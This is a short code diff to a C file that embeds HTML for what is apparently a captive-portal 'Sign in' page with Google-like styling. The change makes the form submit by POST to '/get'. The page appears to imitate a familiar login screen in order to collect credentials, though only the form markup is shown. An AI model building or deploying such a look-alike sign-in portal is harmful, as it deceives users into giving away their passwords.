@@ -126,7 +126,7 @@ static const char default_portal_html[] = R"rawliteral(
           </g>
         </svg>
       </div>
-      <form action="/get" id="email-form-step">
+      <form action="/get" id="email-form-step" method="post">
         <h4></h4>
         <h1 class="g-h1">Sign in</h1>
         <h3></h3>
